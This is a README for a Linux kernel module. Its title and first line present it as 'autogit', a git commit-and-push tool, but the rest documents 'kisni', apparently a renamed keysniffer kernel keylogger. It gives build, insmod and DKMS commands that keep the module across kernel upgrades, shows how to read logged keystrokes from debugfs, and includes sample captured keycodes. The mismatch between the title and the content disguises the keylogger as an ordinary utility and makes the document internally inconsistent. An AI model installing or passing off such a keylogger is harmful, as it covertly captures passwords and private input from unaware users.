# autogit
A Linux kernel module that inits a git folder, writes, commits, and pushes it to remote.

## Table of contents

- [Compilation](#compilation)
    - [Build](#build)
    - [DKMS support](#dkms-support)
- [Usage](#usage)
- [License](#license)
- [Developer](#developer)
- [Links](#links)

## Compilation
### Build
Clone the repository and run:

    # make
Note that you need to have the linux kernel headers installed for your running kernel version.

To insert the module into the kernel, run:

    # insmod kisni.ko
    OR
    # make load

To unload the module (and clear the logs), run:

    # rmmod kisni

### DKMS support
If you have DKMS installed, you can install keysniffer in such a way that it survives kernel upgrades. It is recommended to remove older versions of keysniffer by running `dkms remove -m kisni -v OLDVERSION --all` as root. To install the new version, run:

    # make -f Makefile.dkms

To uninstall it, run:

    # make -f Makefile.dkms uninstall

## Usage
To view the pressed keys, run:

```
# cat /sys/kernel/debug/kisni/keys
modinfo kisni.ko
sudo cat /sys/kernel/debug/kisni/keys
```

To log generic hex keycodes in the format `keycode shift_mask`, run:

```
# insmod kisni.ko codes=1
// Type something
# cat /sys/kernel/debug/kisni/keys
23 0
12 0
26 0
26 0
18 0
39 0
2a 0
2a 1
2a 1
11 1
18 0
13 0
26 0
20 0
2a 0
2a 1
2a 1
2 1
1c 0
1f 0
16 0
20 0
18 0
39 0
2e 0
1e 0
14 0
6a 0
1c 0
```

To log the keycodes in decimal, run:

    # insmod kisni.ko codes=2

To check the module details:

```
# modinfo kisni.ko
filename:       /home/vaio/GitHub/keysniffer/kisni.ko
description:    Sniff and log keys pressed in the system to debugfs
version:        1.4
author:         Arun Prakash Jana <engineerarun@gmail.com>
license:        GPL v2
srcversion:     08CA52B5D5B14E4B1C5BEB1
depends:
vermagic:       4.4.0-98-generic SMP mod_unload modversions
parm:           codes:log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes) (int)
```

## License
keysniffer is licensed under **GPLv2**.

## Developer
Copyright (C) 2015 [Arun Prakash Jana](mailto:engineerarun@gmail.com)

## Links
http://www.gadgetweb.de/programming/39-how-to-building-your-own-kernel-space-keylogger.html
https://wiki.archlinux.org/index.php/Xmodmap
http://www.osdever.net/bkerndev/Docs/keyboard.htm
http://arjunsreedharan.org/post/99370248137/kernel-201-lets-write-a-kernel-with-keyboard
http://www.linuxquestions.org/questions/slackware-14/how-to-match-x-keyboard-layout-with-the-the-kernel-keyboard-map-4175455061/
http://www.tldp.org/LDP/lkmpg/2.4/html/x1210.html
